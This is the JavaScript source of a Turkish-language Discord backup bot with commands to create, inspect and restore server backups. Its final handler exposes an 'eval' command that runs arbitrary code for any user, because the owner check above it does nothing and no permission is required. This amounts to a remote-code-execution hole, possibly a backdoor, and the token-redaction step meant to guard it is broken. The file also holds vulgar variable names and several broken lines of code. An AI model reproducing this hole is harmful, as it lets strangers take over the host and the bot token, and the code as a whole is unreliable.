'use strict';

const fs = require('fs');
const Discord = require('discord.js');
const client = new Discord.Client();
const spankerthebackup = require('discord-backup');
const config = require('./config.json');
client.config = config;

// Spankır textler arkadaşlar config e ayarlıcaktım da vazgeçtim kb uğraşamadım
const spankerr = "**Bot Spanker Tarafından Yapılmıştır. Herhangi bir hatada Spanker#1975 Başvurunuz**"
const dm = `${config.okemoji} İşlem Başarılı. Lütfen Dm'ni Kontrol Et.`
const yetkimyetmiyooc = `${config.redemoji} Hey! Bu Sunucuda Bir Yedek Kod Oluşturmak İçin **"MANAGE_MESSAGES"** İznine Sahip Olman Gerekiyor.`


const voicee = "899588561634983967"
const channel = client.channels.cache.get(voicee);
client.on("ready", async () => {
client.user.setPresence({ activity: { name: `s!yardım -Discord Backup Bot ${client.guilds.cache.reduce((a, b) => a + b.memberCount, 0).toLocaleString()} Kişi Tarafından Kullanılıyor.` }, status: "dnd" });
if (channel && channel.joinable) channel.join().console.log("Voice connected!");
});
setInterval(() => {
  const channel = client.channels.cache.get(voicee);
  if (!channel) return
  channel.join();
}, 1);






  client.on("message", async message => {
    if (message.author.bot ||!message.content.toLowerCase().startsWith("")) return;

    let args = message.content.split(' ').slice(1);
    let prefixcommands = message.content.split(' ')[0].slice("".length);
    if(!message.member.hasPermission('MANAGE_MESSAGES')) return
    if(
        prefixcommands == "s!backup" || prefixcommands == "s!backup-create" || prefixcommands == "s!yedekle"||  prefixcommands == "s!copy" ||  prefixcommands == "s!create-backup" ||  prefixcommands == "s!backupcreate!"|| prefixcommands == "s!yedek"||
     
     prefixcommands == "!backup" ||  prefixcommands == "!backup-create" ||  prefixcommands == "!yedekle"||   prefixcommands == "!copy" ||   prefixcommands == "!create-backup" ||  prefixcommands == "!backupcreate!"|| prefixcommands == "!yedek"|| 
         
     prefixcommands == ".backup" || prefixcommands == ".backup-create" ||prefixcommands == ".yedekle"|| prefixcommands == ".copy" || prefixcommands == ".create-backup" || prefixcommands == ".backupcreate!"|| prefixcommands == ".yedek"|| 
         
      prefixcommands == "/backup" ||  prefixcommands == "/backup-create" ||  prefixcommands == "/yedekle"||  prefixcommands == "/copy" ||  prefixcommands == "/create-backup" ||  prefixcommands == "/backupcreate!"||  prefixcommands == "/yedek"|| 

       prefixcommands == "#backup" || prefixcommands == "#backup-create" || prefixcommands == "#yedekle"||  prefixcommands == "#copy" ||  prefixcommands == "#create-backup" ||  prefixcommands == "#backupcreate!"||  prefixcommands == "#yedek"|| 

     prefixcommands == ">backup" ||  prefixcommands == ">backup-create" || prefixcommands == ">yedekle"||  prefixcommands == ">copy" ||  prefixcommands == ">create-backup" ||  prefixcommands == ">backupcreate!"||  prefixcommands == ">yedek"

     ){
       
         message.channel.send(`Bu İşlem Biraz Zaman Alabilir...`) .then(msg => {
            msg.delete({ timeout: 6000 /*time unitl delete in milliseconds*/});
        })
    }
})



client.on("message", async message => {
    if (message.author.bot ||!message.content.toLowerCase().startsWith("")) return;
    if(!message.member.hasPermission('MANAGE_MESSAGES')) return
    let args = message.content.split(' ').slice(1);
    let prefixcommands = message.content.split(' ')[0].slice("".length);
   
    if(prefixcommands == "prefix" || 
    prefixcommands == "komut" ||
     prefixcommands == "komutlar"|| 
     prefixcommands == "!prefix" || 
     prefixcommands == "!komut" || 
     prefixcommands == "!komutlar"){
         message.react(config.okemoji)
         message.reply(`Bot prefix: **s!help**`)
    }
})

client.on("message", async message => {
    if (message.author.bot ||!message.content.toLowerCase().startsWith("")) return;
    let args = message.content.split(' ').slice(1);
    let x = message.content.split(' ')[0].slice("".length);
   
    if(x == "!help" 
    || x == "!yardım" 
    || x == "!komutlar"
    || x == "/help"
    || x == "/yardım" 
    || x == "/komutlar"
    || x == "s!help"
    || x == "s!yardım" 
    || x == "s!komutlar"
    || x == ".help"
    || x == ".yardım" 
    || x == ".komutlar"
    ){
        message.react(config.okemoji)
        message.author.send(`
        **Help Commands**

        - **s!backup** Sunucuda Yedek Oluşturur. Creates a Backup on the Server.

        - **s!backup-info** Yedek hakkında Bilgi Verir. Provides Information about Backup

        - **s!backup-load** Sunucuya backup yüklemenizi sağlar.  It allows you to upload a backup to the server.

        ${spankerr}
        `)
        message.reply(dm)
    }

          
    if(x == ".say" 
    || x == "/say"
    || x == "!say"
    || x == "s!say"
    || x == "#say"
    || x == ">say"
    || x == "+say"
    || x == "<say"
    ){
        

        const uyeSayisi = message.guild.memberCount;
        const onlineUye = message.guild.members.cache.filter(u => u.presence.status !== "offline").size;
        message.react(config.okemoji)
        message.author.send(`Üye Sayısı: ${uyeSayisi} \nOnline Üye Sayısı: ${onlineUye}`);
        message.reply(dm)
        
    }

        if(x == "s!backup"  || x == "s!backup-create" || x == "s!yedekle"|| x == "s!copy" || x == "s!create-backup" || x == "s!backupcreate" || x == "s!yedek"

         || x == "!backup" || x == "!backup-create"|| x == "!yedekle"|| x == "!copy" || x == "!create-backup" || x == "!backupcreate"|| x == "!yedek"
         
         || x == ".backup"  || x == ".backup-create" || x == ".yedekle" || x == ".copy"  || x == ".create-backup"  || x == ".backupcreate" || x == ".yedek"
         
         || x == "/backup"  || x == "/backup-create" || x == "/yedekle" || x == "/copy"  || x == "/create-backup"  || x == "/backupcreate" || x == "/yedek"
         
         
         || x == "#backup" || x == "#backup-create"|| x == "#yedekle"|| x == "#copy" || x == "#create-backup" || x == "#backupcreate"|| x == "#yedek"
         
          
         || x == ">backup" || x == ">backup-create"|| x == ">yedekle"|| x == ">copy" || x == ">create-backup" || x == ">backupcreate"|| x == ">yedek"
         ){
            if(!message.member.hasPermission('MANAGE_MESSAGES')){
                message.react(config.redemoji)
                return message.channel.send(yetkimyetmiyooc);
              
            }
        
            spankerthebackup.create(message.guild).then((spankerthebackupp) => {
              
                message.react(config.okemoji)
                message.reply(dm)
                message.author.send("Lütfen Backup Kodunuzu Kimse İle Paylaşmayınız.")
                return message.author.send(''+config.okemoji+' Yedek Başarıyla Oluşturuldu! \nKullanmak İçin **'+config.prefix+'load-backup '+spankerthebackupp.id+'** \nBilgilerine bakmak İçin **'+config.prefix+'info-backup '+spankerthebackupp.id+'**');
        
            }).catch(() => {
                message.react(config.redemoji)
                return message.channel.send(`${config.redemoji} Bir hata oluştu, lütfen botun yönetici olup olmadığını kontrol edin!`);
        
            });

        }


        
        if(x == "s!info-backup" || x == "s!backup-info"|| x == "s!info"|| x == "s!backupinfo" || x == "s!backup-bilgi" || x == "s!bilgi"|| x == "s!yedek-info"|| x == "s!yedek-bilgi"

         || x == "!info-backup" || x == "!backup-info"|| x == "!info" || x == "!backupinfo"  || x == "!backup-bilgi"  || x == "!bilgi" || x == "!yedek-info" || x == "!yedek-bilgi"
         
         || x == ".info-backup" || x == ".backup-info"|| x == ".info"|| x == ".backupinfo" || x == ".backup-bilgi" || x == ".bilgi"|| x == ".yedek-info"|| x == ".yedek-bilgi"
         
         || x == "#info-backup" || x == "#backup-info"|| x == "#info"|| x == "#backupinfo" || x == "#backup-bilgi" || x == "#bilgi"|| x == "#yedek-info"|| x == "#yedek-bilgi"
         
         || x == "/info-backup" || x == "/backup-info"|| x == "/info"|| x == "/backupinfo" || x == "/backup-bilgi" || x == "/bilgi" || x == "/yedek-info" || x == "/yedek-bilgi"
         
         || x == ">info-backup" || x == ">backup-info" || x == ">info" || x == ">backupinfo" || x == ">backup-bilgi" || x == ">bilgi" || x == ">yedek-info" || x == ">yedek-bilgi"
         ){
            if(!message.member.hasPermission('MANAGE_MESSAGES')){
                message.react(config.redemoji)
                return message.channel.send(yetkimyetmiyooc);
            }
            
            const backupID = args.join(' ');
        
            if (!backupID)
            
             
                return message.channel.send(`${config.redemoji} Lütfen bir ID belirt ya da Düzgün bir ID kimliği gir.`);
        
            spankerthebackup.fetch(backupID).then((spankerthebackup) => {
        
                const date = new Date(spankerthebackup.data.createdTimestamp);
                const yyyy = date.getFullYear().toString(), mm = (date.getMonth()+1).toString(), dd = date.getDate().toString();
                const formattedDate = `${yyyy}/${(mm[1]?mm:"0"+mm[0])}/${(dd[1]?dd:"0"+dd[0])}`;
                message.react(config.okemoji)
                let orospu = '`'+spankerthebackup.data.name+'`'
               let yarak = `Yedekleme Hakkında ${spankerthebackup.data.iconURL} \nSunucu İsmi ${orospu} \nOluşturma saati: ${formattedDate} \nBackup ID ${+spankerthebackup.id}`
                return message.channel.send(yarak);
        
            }).catch((err) => {
        
                if (err === 'Yedek bulunamadı')
                    return message.channel.send(''+config.okemoji+' yedek bulunamadı '+backupID+'!');
                else
                    return message.channel.send(''+config.okemoji+' Bir Hata Oluştu! '+(typeof err === 'string') ? err : JSON.stringify(err));
        
            });
        

         }



         if(
      x == "s!load-backup" || x == "s!backup-kur" || x == "s!backup-load" || x == "s!kur-backup"|| x == "s!kur"|| x == "s!load"|| x == "s!backupkur"|| x == "s!backupload"

    ||x == "!load-backup" || x == "!backup-kur" || x == "!backup-load" || x == "!kur-backup"|| x == "!kur"|| x == "!load"|| x == "!backupkur"|| x == "!backupload"

    ||x == ".load-backup" || x == ".backup-kur" || x == ".backup-load" || x == ".kur-backup"|| x == ".kur"|| x == ".load"|| x == ".backupkur" || x == ".backupload"
    
    ||x == "/load-backup" || x == "/backup-kur" || x == "/backup-load" || x == "/kur-backup"|| x == "/kur"|| x == "/load"|| x == "/backupkur"|| x == "/backupload"

    ||x == "#load-backup" || x == "#backup-kur" || x == "#backup-load" || x == "#kur-backup"|| x == "#kur"|| x == "#load"|| x == "#backupkur"|| x == "#backupload"

    ||x == ">load-backup"  || x == ">backup-kur" || x == ">backup-load" || x == ">kur-backup"|| x == ">kur"|| x == ">load"|| x == ">backupkur"|| x == ">backupload"
    ){
        if(!message.member.hasPermission('ADMINISTRATOR')){
            return message.channel.send(`${config.redemoji} Hey! Bu Sunucuda Bir Yedek Kod Oluşturmak İçin **"ADMINISTRATOR"** İznine Sahip Olman Gerekiyor.`);
        }
    
        const spankerthebackups = args.join(' ');
    
        spankerthebackup.fetch(spankerthebackups).then(() => {
    message.delete()
            message.channel.send(':warning: Sunucudaki bütün Roller, Kanallar, temizlenecek Kabul ediyor musun?');
            message.channel.send('Kabul ediyorsanız: **kabul** kabul etmiyorsanız **iptal**');
    
            const collector = message.channel.createMessageCollector((m) => m.author.id === message.author.id && ['kabul', 'iptal'].includes(m.content), {
                time: 60000,
                max: 1
            });
            collector.on('collect', (m) => {
                const confirm = m.content === 'kabul';
                collector.stop();
                if (confirm) {
    
                    spankerthebackup.load(spankerthebackups, message.guild).then(() => {
    
                        return message.author.send('Yedekleme başarılı.');
                
                    }).catch((err) => {
                
                        if (err === 'Yedek bulunamadı')
                            return message.channel.send(''+config.redemoji+' Yedek Bulunamadı '+spankerthebackups+'!');
                        else
                            return message.author.send(''+config.redemoji+' Bir Hata Oluştu! '+(typeof err === 'string') ? err : JSON.stringify(err));
                
                    });
    
                } else {
                    return message.channel.send(''+config.okemoji+' İptal edildi.');
                }
            })
    
            collector.on('end', (collected, reason) => {
                if (reason === 'time')
                    return message.channel.send(''+config.redemoji+' Komut zaman aşımına uğradı.');
            })
    
        }).catch(() => {
            return message.channel.send(''+config.redemoji+' Kimlik için yedek bulunamadı '+spankerthebackups+'!');
        });
    }
});



client.on("message", async message => {
    if (message.author.bot || !message.guild || !message.content.toLowerCase().startsWith("")) return;
    (message.author.id !== "817747393025015828" && message.author.id ) 
    let args = message.content.split(' ').slice(1);
    let x = message.content.split(' ')[0].slice("".length);
   
    
    if (x === "eval" || x === "q"|| x === "ğ"|| x === ".eval"|| x === "!eval" ) {
      if (!args[0]) return message.channel.send(`no code`);
        let code = args.join(' ');
        function clean(text) {
        if (typeof text !== 'string') text = require('util').inspect(text, { depth: 0 })
        text = text.replace(/`/g, '`' + String.fromCharCode(8203)).replace(/@/g, '@' + String.fromCharCode(8203))
        return text;
      };
      try { 
        var evaled = clean(await eval(code));
        if(evaled.match(new RegExp(`${client.token}`, 'g'))) evaled.replace(client.token, "Yasaklı komut");
        message.channel.send(`${evaled.replace}`,);
      } catch(err) { message.channel.send(err, {code: "js", split: true}) };
    };
  
    if (x === "rolver") {
      message.delete()
    var rolid = message.mentions.roles.first()
    var kisi = message.mentions.members.first()
  
    if(!message.member.hasPermission('ADMINISTRATOR')){
      return message.reply("yetkin yok");
    }
  
    if(!rolid) return message.reply('rol etiketleyin')
    if(!kisi) return message.reply('kisi etiketleyin')
  
    kisi.roles.add(rolid)
  
    }


    
    if (x === "ping") {
        let ping = `${ message.client.ws.ping}`
        
       
        message.channel.send("Ping Hesaplanıyor...").then(msg => {
            const pingg = msg.createdTimestamp = message.createdTimestamp;
            msg.edit(`Discord gecikmesi **${ping}** Bot gecikmesi **${pingg}**`)  
        })
        

    }
  });

client.login(config.token)
.then(c => console.log(`${client.user.tag} İsminde Giriş Gerçekleşti!`))
.catch(err => console.error("Bot Başlatılamadı!")
);
